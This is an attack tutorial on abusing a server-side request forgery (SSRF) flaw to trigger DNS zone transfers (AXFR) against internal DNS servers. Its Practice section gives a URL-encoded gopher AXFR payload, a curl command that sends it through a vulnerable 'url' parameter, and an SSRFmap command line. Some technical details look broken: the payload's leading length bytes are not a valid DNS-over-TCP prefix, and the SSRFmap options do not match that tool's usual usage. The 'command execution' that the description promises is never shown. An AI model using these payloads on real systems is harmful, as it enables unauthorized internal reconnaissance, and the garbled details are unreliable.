---
title: 'Exploiting DNS AXFR via SSRF: Internal Data Exposure'
description: Learn how to trigger DNS AXFR using SSRF vulnerabilities to expose internal
  DNS zones and execute commands.
keywords:
- DNS AXFR
- SSRF
- zone transfer
- internal DNS
- data exfiltration
- network security
- payload construction
---

# DNS AXFR Trigger

## Context

This article is designed to demonstrate how to exploit Server-Side Request Forgery (SSRF) to trigger a DNS AXFR (zone transfer), leveraging vulnerabilities in DNS servers for unauthorized data exfiltration or command execution within internal networks. Readers should have a foundational understanding of the DNS protocol, specifically the zone transfer mechanism (AXFR), and be familiar with SSRF basics and how it can lead to command execution.

## Theory

### DNS AXFR and Zone Transfer Mechanics

DNS AXFR is a protocol operation that facilitates the full transfer of DNS zone information between DNS servers. This mechanism is intended for replication purposes between trusted DNS servers and is not designed to be publicly accessible. However, its misconfiguration can allow unauthorized AXFR requests, leading to exposure of sensitive internal zone data such as hostnames, IPs, and potentially other sensitive infrastructure details.

### SSRF as a Vector for DNS AXFR

Server-Side Request Forgery (SSRF) allows an attacker to make requests on behalf of a server, potentially accessing internal services. Attackers can exploit SSRF vulnerabilities to send crafted AXFR requests to internal DNS servers, exploiting web applications that allow SSRF to communicate with internal infrastructure, thus bypassing typical network segmentation and access controls.

### Payload Construction for DNS AXFR via SSRF

To exploit DNS AXFR via SSRF, payloads must be correctly crafted to encode DNS AXFR requests using supported SSRF protocols such as gopher or HTTP. The gopher protocol is particularly useful for bypassing URL filtering to reach DNS services, due to its ability to encode complex requests and communicate with services otherwise inaccessible by standard HTTP requests.

### Risks and Impact of DNS AXFR Trigger

A successful exploitation revealing the DNS AXFR exposes internal hostnames, IP addresses, and sensitive infrastructure information, leading to potential reconnaissance and further attacks within the compromised network. This data may be exfiltrated via SSRF responses or through secondary channels like timing attacks or error messages, significantly compromising network integrity.

## Practice

### Triggering DNS AXFR via SSRF with Gopher Payload

- **Identify SSRF Injection Point**: Start by identifying a vulnerable SSRF endpoint within the application that accepts arbitrary protocols and URL schemes.

- **Craft Gopher Payload**: Construct a gopher payload for a raw AXFR request to the DNS server. Use the syntax:
    ```http
    gopher://<internal-dns-ip>:53/_%00%00%10%00%01%00%00%00%00%00%00%07example%03com%00%00%fc%00%01
    ```
  Replace `<internal-dns-ip>` and `example.com` with the appropriate internal DNS server IP and domain name.

- **Send the Payload via SSRF**:
    ```bash
    curl -X POST 'https://target-app/vuln-ssrf?url=gopher://10.0.0.2:53/_%00%00%10%00%01%00%00%00%00%00%00%07example%03com%00%00%fc%00%01'
    ```
  Submit this crafted request through the SSRF endpoint to trigger the AXFR request.

- **Analyze Application Response**: Examine the application's response for evidence of DNS zone data or error messages. Look specifically for any internal host information or service banner disclosures.

### Automated DNS AXFR Trigger via SSRF Exploitation Tool

- **Leverage SSRF Exploitation Tools**: Utilize tools like SSRFmap or Gopherus which allow for the crafting of custom protocol payloads efficiently.

- **Execute Automated Trigger**:
    ```bash
    python3 ssrfmap.py -u 'https://target-app/vuln-ssrf?url=FUZZ' --data 'gopher://10.0.0.2:53/_%00%00%10%00%01%00%00%00%00%00%00%07example%03com%00%00%fc%00%01' --run
    ```
  Run the appropriate command using the tool, adjusting parameters to fit your specific target and objective.

- **Review Results**: Extract and review the toolâ€™s output for DNS zone transfer results, which may include internal DNS records and their associated data.

## Tools

- **curl**
- **ssrfmap**
- **Gopherus**